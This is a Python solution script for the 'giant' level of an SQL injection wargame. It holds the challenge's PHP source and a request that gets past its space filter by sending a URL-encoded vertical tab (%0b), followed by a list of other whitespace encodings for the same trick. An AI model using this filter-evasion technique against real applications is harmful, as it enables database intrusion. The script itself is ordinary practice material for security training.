import requests
import urllib.parse
"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result[1234]) solve("giant"); 
  highlight_file(__FILE__); 
?>
"""

url = "https://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0b" 
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")

"""
the way to insert space

%09  (tab \t)
%0a  (linefeed \n)
%0b  (vertical tab)
%0c  (form feed)
%0d  (carriage return \r)
"""